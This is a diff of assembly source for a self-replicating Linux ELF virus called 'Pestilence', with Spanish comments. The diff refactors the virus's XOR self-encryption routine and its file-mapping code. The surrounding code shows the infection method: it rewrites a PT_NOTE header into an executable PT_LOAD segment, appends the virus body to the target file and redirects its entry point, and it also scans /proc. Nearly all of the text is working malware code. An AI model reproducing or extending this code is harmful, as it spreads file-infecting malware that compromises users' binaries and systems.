@@ -76,7 +76,6 @@ section .text
         lea rax, VAR(Pestilence.note_phdr_ptr)
         mov rax, [rax]
         mov [rax], dword 0x01                           ; p_type = PT_LOAD
-        ; mov [rax+Elf64_Phdr.p_flags], P_FLAGS               
         mov [rax+Elf64_Phdr.p_flags], dword P_FLAGS     ; P_FLAGS = PF_X | PF_R | PF_W
         mov ecx, dword VAR(Pestilence.file_final_len)
         sub ecx, dword VAR(Pestilence.virus_size)
@@ -133,7 +132,7 @@ section .text
         ret
     __F_crazy__end:
 
-    __F_encrypt_data:
+    __F_encrypt_block:
         lea r10, [rel __F_data]         ; base función
         mov rbx, 0x2537683570773774
         mov rax, 0x0404040404040404
@@ -153,7 +152,31 @@ section .text
             cmp rcx, (__F_data__end - __F_data)
             jl .encrypt_data_loop
         ret
-    __F_encrypt_data__end:
+    __F_encrypt_block__end:
+
+    __F_mmap:
+        ; mmap size : original_len + 0x4000. After ftruncate, writes are OK
+        mov eax, dword VAR(Pestilence.file_original_len)
+        ; align current size to end at 4K page so our payload is aligned by writing it
+        ; at the end.
+        ALIGN rax
+        mov ecx, dword VAR(Pestilence.virus_size)
+        add rax, rcx
+
+        ; save aligned size of file + virus size.
+        mov dword VAR(Pestilence.file_final_len), eax
+
+        ; mmap(NULL, file_original_len, PROT_READ | PROT_WRITE, MAP_SHARED, fd_file, 0)
+        mov rdi, 0x0
+        mov rsi, rax
+        mov rdx, PROT_READ | PROT_WRITE
+        mov r10, MAP_SHARED
+        mov r8, VAR(Pestilence.fd_file)
+        mov r9, 0x0
+        mov rax, SC_MMAP
+        syscall
+        ret
+    __F_mmap__end:
 
 ; ----------------------------------------------------------------------------------------------------------------------
 
@@ -171,27 +194,7 @@ section .text
         sub rbx, rax
         mov dword VAR(Pestilence.virus_size), ebx
         
-     .decrypt_data:   
-        ; Desencriptar data
-        lea r10, [rel __F_data]         ; base función
-        mov rbx, 0x2537683570773774
-        mov rax, 0x0404040404040404 
-        xor rbx, rax
-        xor rcx, rcx              ; contador función
-        xor rdx, rdx              ; índice key
-
-    .decrypt_data_loop:
-        mov r8b, [r10 + rcx]
-        mov r9b, bl
-        xor r8b, r9b
-        mov [r10 + rcx], r8b
-        
-        ror rbx, 8
-
-        inc rcx
-        cmp rcx, (__F_data__end - __F_data)
-        jl .decrypt_data_loop       
-
+        CALL_ENCRYPT(encrypt_block) ; desencripta
 
     .open_proc:
         ; open("/proc", O_RDONLY, NULL)
@@ -496,26 +499,9 @@ section .text
         jmp .close_file
 
     .mmap:
-        ; mmap size : original_len + 0x4000. After ftruncate, writes are OK
-        mov eax, dword VAR(Pestilence.file_original_len)
-        ; align current size to end at 4K page so our payload is aligned by writing it
-        ; at the end.
-        ALIGN rax
-        mov ecx, dword VAR(Pestilence.virus_size)
-        add rax, rcx
 
-        ; save aligned size of file + virus size.
-        mov dword VAR(Pestilence.file_final_len), eax
+        CALL_ENCRYPT(mmap)
 
-        ; mmap(NULL, file_original_len, PROT_READ | PROT_WRITE, MAP_SHARED, fd_file, 0)
-        mov rdi, 0x0
-        mov rsi, rax
-        mov rdx, PROT_READ | PROT_WRITE
-        mov r10, MAP_SHARED
-        mov r8, VAR(Pestilence.fd_file)
-        mov r9, 0x0
-        mov rax, SC_MMAP
-        syscall
         test rax, rax
         jle .close_file
         mov VAR(Pestilence.mmap_ptr), rax   ; save mmap_ptr
@@ -590,7 +576,7 @@ section .text
 
     .mod_pt_note:
         CALL_ENCRYPT(mod_pt_note)
-        CALL_ENCRYPT(encrypt_data)
+        CALL_ENCRYPT(encrypt_block) ; encripta
 
         ; Encriptar data
     
@@ -616,7 +602,7 @@ section .text
         mov rbx, VAR(Pestilence.new_entry)
         mov [rax + Elf64_Ehdr.e_entry], rbx
 
-        CALL_ENCRYPT(encrypt_data)
+        CALL_ENCRYPT(encrypt_block) ; desencipta
 
     .munmap:
         ;munmap(map_ptr, len)
